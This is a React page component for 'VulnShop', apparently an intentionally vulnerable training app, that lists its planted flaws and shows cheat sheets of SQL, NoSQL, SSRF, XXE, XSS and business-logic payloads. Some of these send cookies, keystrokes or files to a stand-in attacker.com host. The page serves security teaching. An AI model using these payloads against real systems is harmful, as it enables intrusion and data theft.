import { useState, useEffect } from "react";
import { Link } from "react-router-dom";
import axios from "axios";
import { 
  Shield, AlertTriangle, Bug, Code, Database, Server, 
  FileCode, Lock, DollarSign, Eye, ChevronDown, ChevronUp,
  Copy, Check, ExternalLink, Terminal, Zap
} from "lucide-react";
import { Button } from "./components/ui/button";
import { Badge } from "./components/ui/badge";
import {
  Accordion,
  AccordionContent,
  AccordionItem,
  AccordionTrigger,
} from "./components/ui/accordion";
import { toast } from "sonner";

const BACKEND_URL = process.env.REACT_APP_BACKEND_URL;
const API = `${BACKEND_URL}/api`;

const severityColors = {
  Critical: "bg-red-500/20 text-red-400 border-red-500/50",
  High: "bg-orange-500/20 text-orange-400 border-orange-500/50",
  Medium: "bg-yellow-500/20 text-yellow-400 border-yellow-500/50",
  Low: "bg-blue-500/20 text-blue-400 border-blue-500/50",
  Info: "bg-gray-500/20 text-gray-400 border-gray-500/50"
};

const categoryIcons = {
  "Injection": <Database className="w-5 h-5" />,
  "Server-Side Request Forgery": <Server className="w-5 h-5" />,
  "XML External Entity": <FileCode className="w-5 h-5" />,
  "Broken Access Control": <Lock className="w-5 h-5" />,
  "Cross-Site Scripting": <Code className="w-5 h-5" />,
  "Business Logic": <DollarSign className="w-5 h-5" />,
  "Security Misconfiguration": <Eye className="w-5 h-5" />
};

const CodeBlock = ({ code, language = "bash" }) => {
  const [copied, setCopied] = useState(false);

  const copyToClipboard = () => {
    navigator.clipboard.writeText(code);
    setCopied(true);
    toast.success("Copied to clipboard!");
    setTimeout(() => setCopied(false), 2000);
  };

  return (
    <div className="relative group">
      <pre className="bg-black/80 border border-white/10 p-4 overflow-x-auto font-mono text-sm text-cyan-300">
        <code>{code}</code>
      </pre>
      <button
        onClick={copyToClipboard}
        className="absolute top-2 right-2 p-2 bg-white/10 hover:bg-white/20 transition-colors opacity-0 group-hover:opacity-100"
        data-testid="copy-code-btn"
      >
        {copied ? <Check className="w-4 h-4 text-green-400" /> : <Copy className="w-4 h-4 text-gray-400" />}
      </button>
    </div>
  );
};

const VulnerabilityCard = ({ vuln }) => {
  const [expanded, setExpanded] = useState(false);

  return (
    <div 
      className="card-cyber cyber-border p-6 transition-all duration-300 hover:border-cyan-400/50"
      data-testid={`vuln-card-${vuln.id}`}
    >
      <div className="flex items-start justify-between mb-4">
        <div className="flex items-center space-x-3">
          <div className="p-2 bg-cyan-400/10 border border-cyan-400/30">
            {categoryIcons[vuln.category] || <Bug className="w-5 h-5 text-cyan-400" />}
          </div>
          <div>
            <h3 className="font-rajdhani text-lg font-bold text-white tracking-wide">
              {vuln.name}
            </h3>
            <p className="text-gray-500 font-mono text-xs">{vuln.category}</p>
          </div>
        </div>
        <Badge className={`${severityColors[vuln.severity]} border font-mono text-xs`}>
          {vuln.severity}
        </Badge>
      </div>

      <p className="text-gray-400 font-mono text-sm mb-4">
        {vuln.description}
      </p>

      <div className="space-y-3 mb-4">
        <div className="flex items-center space-x-2">
          <span className="text-gray-500 font-mono text-xs">ENDPOINT:</span>
          <code className="bg-black/50 px-2 py-1 text-cyan-400 font-mono text-xs">
            {vuln.method} {vuln.endpoint}
          </code>
        </div>
        <div className="flex items-center space-x-2">
          <span className="text-gray-500 font-mono text-xs">CWE:</span>
          <a 
            href={`https://cwe.mitre.org/data/definitions/${vuln.cwe.split('-')[1]}.html`}
            target="_blank"
            rel="noopener noreferrer"
            className="text-cyan-400 font-mono text-xs hover:underline flex items-center"
          >
            {vuln.cwe} <ExternalLink className="w-3 h-3 ml-1" />
          </a>
        </div>
      </div>

      <button
        onClick={() => setExpanded(!expanded)}
        className="flex items-center space-x-2 text-cyan-400 font-mono text-sm hover:text-cyan-300 transition-colors"
        data-testid={`expand-${vuln.id}`}
      >
        {expanded ? <ChevronUp className="w-4 h-4" /> : <ChevronDown className="w-4 h-4" />}
        <span>{expanded ? "Hide" : "Show"} Exploitation Details</span>
      </button>

      {expanded && (
        <div className="mt-4 pt-4 border-t border-white/10 space-y-4 animate-slide-up">
          <div>
            <h4 className="text-gray-400 font-mono text-xs mb-2">EXAMPLE PAYLOAD:</h4>
            <CodeBlock code={vuln.example_payload} />
          </div>
          <div>
            <h4 className="text-gray-400 font-mono text-xs mb-2">IMPACT:</h4>
            <p className="text-red-400 font-mono text-sm">{vuln.impact}</p>
          </div>
        </div>
      )}
    </div>
  );
};

export const VulnerabilitiesPage = () => {
  const [vulnerabilities, setVulnerabilities] = useState([]);
  const [categories, setCategories] = useState({});
  const [selectedCategory, setSelectedCategory] = useState("all");
  const [loading, setLoading] = useState(true);

  useEffect(() => {
    fetchVulnerabilities();
  }, []);

  const fetchVulnerabilities = async () => {
    try {
      const res = await axios.get(`${API}/vulnerabilities`);
      setVulnerabilities(res.data.vulnerabilities);
      setCategories(res.data.categories);
    } catch (e) {
      toast.error("Failed to load vulnerabilities");
    } finally {
      setLoading(false);
    }
  };

  const filteredVulns = selectedCategory === "all" 
    ? vulnerabilities 
    : vulnerabilities.filter(v => v.category === selectedCategory);

  const severityCounts = vulnerabilities.reduce((acc, v) => {
    acc[v.severity] = (acc[v.severity] || 0) + 1;
    return acc;
  }, {});

  return (
    <div className="min-h-screen py-8 px-4 sm:px-6 lg:px-8 max-w-7xl mx-auto">
      {/* Header */}
      <div className="text-center mb-12">
        <div className="flex items-center justify-center space-x-3 mb-4">
          <Shield className="w-10 h-10 text-cyan-400" />
          <h1 className="text-3xl sm:text-4xl font-rajdhani font-bold text-white tracking-wider">
            VULNERABILITY <span className="text-cyan-400">DATABASE</span>
          </h1>
        </div>
        <p className="text-gray-400 font-mono max-w-2xl mx-auto">
          Complete documentation of all intentional security vulnerabilities in VulnShop.
          Use this as a guide for learning and practicing web security testing.
        </p>
      </div>

      {/* Stats */}
      <div className="grid grid-cols-2 sm:grid-cols-4 lg:grid-cols-6 gap-4 mb-8">
        <div className="card-cyber p-4 text-center">
          <p className="font-mono text-3xl text-cyan-400">{vulnerabilities.length}</p>
          <p className="text-gray-500 font-mono text-xs">TOTAL VULNS</p>
        </div>
        {Object.entries(severityCounts).map(([severity, count]) => (
          <div key={severity} className="card-cyber p-4 text-center">
            <p className={`font-mono text-3xl ${severityColors[severity].split(' ')[1]}`}>{count}</p>
            <p className="text-gray-500 font-mono text-xs">{severity.toUpperCase()}</p>
          </div>
        ))}
      </div>

      {/* Category Filter */}
      <div className="flex flex-wrap gap-2 mb-8">
        <Button
          onClick={() => setSelectedCategory("all")}
          className={`font-mono text-xs ${selectedCategory === "all" ? "btn-cyber-primary" : "btn-cyber"}`}
          data-testid="filter-all-vulns"
        >
          ALL ({vulnerabilities.length})
        </Button>
        {Object.entries(categories).map(([cat, count]) => (
          <Button
            key={cat}
            onClick={() => setSelectedCategory(cat)}
            className={`font-mono text-xs ${selectedCategory === cat ? "btn-cyber-primary" : "btn-cyber"}`}
            data-testid={`filter-${cat.toLowerCase().replace(/\s+/g, '-')}`}
          >
            {cat} ({count})
          </Button>
        ))}
      </div>

      {/* Vulnerabilities Grid */}
      {loading ? (
        <div className="text-center py-20">
          <div className="inline-block w-8 h-8 border-2 border-cyan-400 border-t-transparent rounded-full animate-spin" />
        </div>
      ) : (
        <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
          {filteredVulns.map((vuln, index) => (
            <div
              key={vuln.id}
              className="animate-slide-up opacity-0"
              style={{ animationDelay: `${index * 0.05}s`, animationFillMode: 'forwards' }}
            >
              <VulnerabilityCard vuln={vuln} />
            </div>
          ))}
        </div>
      )}

      {/* Quick Reference */}
      <div className="mt-16">
        <h2 className="text-2xl font-rajdhani font-bold text-white tracking-wider mb-6">
          QUICK <span className="text-cyan-400">REFERENCE</span>
        </h2>
        
        <Accordion type="multiple" className="space-y-4">
          <AccordionItem value="sqli" className="card-cyber border-none">
            <AccordionTrigger className="px-6 py-4 font-rajdhani text-lg text-white hover:no-underline">
              <div className="flex items-center space-x-3">
                <Database className="w-5 h-5 text-cyan-400" />
                <span>SQL Injection Cheat Sheet</span>
              </div>
            </AccordionTrigger>
            <AccordionContent className="px-6 pb-4">
              <div className="space-y-4">
                <CodeBlock code={`# Authentication Bypass
' OR '1'='1' --
' OR '1'='1' /*
admin'--
' OR 1=1#

# Union-based SQLi
' UNION SELECT 1,2,3--
' UNION SELECT username,password,3 FROM legacy_users--

# Error-based SQLi
' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--

# Time-based Blind SQLi
' AND SLEEP(5)--
' WAITFOR DELAY '0:0:5'--`} />
              </div>
            </AccordionContent>
          </AccordionItem>

          <AccordionItem value="nosqli" className="card-cyber border-none">
            <AccordionTrigger className="px-6 py-4 font-rajdhani text-lg text-white hover:no-underline">
              <div className="flex items-center space-x-3">
                <Database className="w-5 h-5 text-purple-400" />
                <span>NoSQL Injection Cheat Sheet</span>
              </div>
            </AccordionTrigger>
            <AccordionContent className="px-6 pb-4">
              <div className="space-y-4">
                <CodeBlock code={`# MongoDB Injection
{"$ne": null}                    # Not equal to null (returns all)
{"$gt": ""}                      # Greater than empty string
{"$regex": ".*"}                 # Match all with regex
{"username": {"$ne": ""}}        # All users
{"$where": "this.password.length > 0"}  # Where clause injection

# Example API call
curl "/api/users/lookup?filter=%7B%22%24ne%22%3A%20null%7D"`} />
              </div>
            </AccordionContent>
          </AccordionItem>

          <AccordionItem value="ssrf" className="card-cyber border-none">
            <AccordionTrigger className="px-6 py-4 font-rajdhani text-lg text-white hover:no-underline">
              <div className="flex items-center space-x-3">
                <Server className="w-5 h-5 text-orange-400" />
                <span>SSRF Payloads</span>
              </div>
            </AccordionTrigger>
            <AccordionContent className="px-6 pb-4">
              <div className="space-y-4">
                <CodeBlock code={`# Internal service discovery
http://localhost:8001/api/
http://127.0.0.1:8001/api/c0ntr0l-p4n3l/
http://[::1]:8001/api/

# Cloud metadata (AWS)
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/user-data/

# Cloud metadata (GCP)
http://metadata.google.internal/computeMetadata/v1/

# File protocol (if supported)
file:///etc/passwd
file:///etc/hostname

# Internal network scanning
http://192.168.1.1/
http://10.0.0.1/`} />
              </div>
            </AccordionContent>
          </AccordionItem>

          <AccordionItem value="xxe" className="card-cyber border-none">
            <AccordionTrigger className="px-6 py-4 font-rajdhani text-lg text-white hover:no-underline">
              <div className="flex items-center space-x-3">
                <FileCode className="w-5 h-5 text-red-400" />
                <span>XXE Payloads</span>
              </div>
            </AccordionTrigger>
            <AccordionContent className="px-6 pb-4">
              <div className="space-y-4">
                <CodeBlock code={`# Basic XXE - File Disclosure
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<products>
  <product>
    <name>&xxe;</name>
  </product>
</products>

# XXE - SSRF
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://internal-server/secret">
]>
<config><setting>&xxe;</setting></config>

# Blind XXE with OOB exfiltration
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
<data>&send;</data>`} />
              </div>
            </AccordionContent>
          </AccordionItem>

          <AccordionItem value="xss" className="card-cyber border-none">
            <AccordionTrigger className="px-6 py-4 font-rajdhani text-lg text-white hover:no-underline">
              <div className="flex items-center space-x-3">
                <Code className="w-5 h-5 text-yellow-400" />
                <span>XSS Payloads</span>
              </div>
            </AccordionTrigger>
            <AccordionContent className="px-6 pb-4">
              <div className="space-y-4">
                <CodeBlock code={`# Basic XSS
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>

# Cookie Stealing
<script>
  new Image().src="http://attacker.com/steal?c="+document.cookie;
</script>

# Keylogger
<script>
  document.onkeypress=function(e){
    new Image().src="http://attacker.com/log?k="+e.key;
  }
</script>

# DOM-based
<img src=x onerror="eval(atob('YWxlcnQoJ1hTUycp'))">

# Filter Bypass
<scr<script>ipt>alert('XSS')</scr</script>ipt>
<svg/onload=alert('XSS')>
<<script>script>alert('XSS')<</script>/script>`} />
              </div>
            </AccordionContent>
          </AccordionItem>

          <AccordionItem value="business" className="card-cyber border-none">
            <AccordionTrigger className="px-6 py-4 font-rajdhani text-lg text-white hover:no-underline">
              <div className="flex items-center space-x-3">
                <DollarSign className="w-5 h-5 text-green-400" />
                <span>Business Logic Attacks</span>
              </div>
            </AccordionTrigger>
            <AccordionContent className="px-6 pb-4">
              <div className="space-y-4">
                <CodeBlock code={`# Negative Quantity Attack
{
  "items": [
    {"product_id": 1, "quantity": -10}
  ],
  "coupon_code": null,
  "shipping_address": "123 Hack St"
}
# Result: Negative total = credit to account

# Coupon Reuse
# Use same coupon code on multiple orders
# Codes: WELCOME10, FLAT50, CYBER25

# Privilege Escalation
PUT /api/profile/update
{
  "role": "admin"
}

# Price Manipulation (if client-side)
# Intercept and modify price in request`} />
              </div>
            </AccordionContent>
          </AccordionItem>
        </Accordion>
      </div>

      {/* Warning Banner */}
      <div className="mt-12 card-cyber border-red-500/30 p-6">
        <div className="flex items-start space-x-4">
          <AlertTriangle className="w-8 h-8 text-red-400 flex-shrink-0" />
          <div>
            <h3 className="font-rajdhani text-lg text-red-400 mb-2">LEGAL DISCLAIMER</h3>
            <p className="text-gray-400 font-mono text-sm">
              This vulnerable application is designed for educational purposes only. 
              Only test on systems you own or have explicit permission to test. 
              Unauthorized access to computer systems is illegal. 
              The authors are not responsible for misuse of this software.
            </p>
          </div>
        </div>
      </div>
    </div>
  );
};

export default VulnerabilitiesPage;
